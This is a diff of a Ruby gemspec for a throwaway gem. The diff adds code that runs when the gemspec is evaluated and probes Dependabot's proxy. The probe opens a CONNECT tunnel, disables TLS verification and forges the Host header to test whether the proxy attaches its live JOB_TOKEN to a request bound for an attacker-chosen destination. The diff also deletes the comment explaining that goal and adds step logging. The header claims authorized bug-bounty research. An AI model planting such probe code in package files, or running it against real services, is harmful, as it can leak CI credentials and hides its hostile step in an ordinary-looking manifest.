@@ -1,32 +1,35 @@
 # Runs at gemspec-evaluation time. Authorized security research for GitHub's
 # Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
-# Tests whether dependabot/proxy's DependabotAPIHandler can be tricked via a
-# CONNECT-target vs inner-Host-header mismatch into attaching the live
-# JOB_TOKEN to a request bound for a destination of our choosing. No token
-# value is hardcoded or assumed; we only observe what the proxy sends.
 begin
   require "socket"
   require "openssl"
   require "timeout"
 
   def host_confusion_probe(proxy_host, proxy_port, connect_target, forged_host, path)
-    Timeout.timeout(6) do
+    steps = []
+    Timeout.timeout(15) do
       sock = TCPSocket.new(proxy_host, proxy_port)
+      steps << "tcp_connected"
       sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
+      steps << "connect_sent"
       connect_resp = sock.readline
+      steps << "connect_resp=#{connect_resp.strip.inspect}"
       ctx = OpenSSL::SSL::SSLContext.new
       ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
       ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
       ssl.hostname = connect_target
       ssl.connect
+      steps << "tls_established"
       req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nConnection: close\r\n\r\n"
       ssl.write(req)
+      steps << "request_sent"
       data = ssl.read(2000)
+      steps << "response_read bytes=#{data.to_s.bytesize}"
       ssl.close
-      "connect_line=#{connect_resp.strip.inspect} sent_host=#{forged_host.inspect} resp_first300=#{data.to_s[0,300].inspect}"
+      steps.join(" | ") + " || resp_first300=#{data.to_s[0,300].inspect}"
     end
   rescue => e
-    "FAILED #{e.class}: #{e.message}"
+    (steps + ["FAILED #{e.class}: #{e.message}"]).join(" | ")
   end
 
   result = host_confusion_probe(
@@ -45,7 +48,7 @@ end
 
 Gem::Specification.new do |s|
   s.name        = "mygem"
-  s.version     = "0.0.3"
+  s.version     = "0.0.4"
   s.summary     = "temp research gem"
   s.authors     = ["researcher"]
   s.files       = ["lib/mygem.rb"]
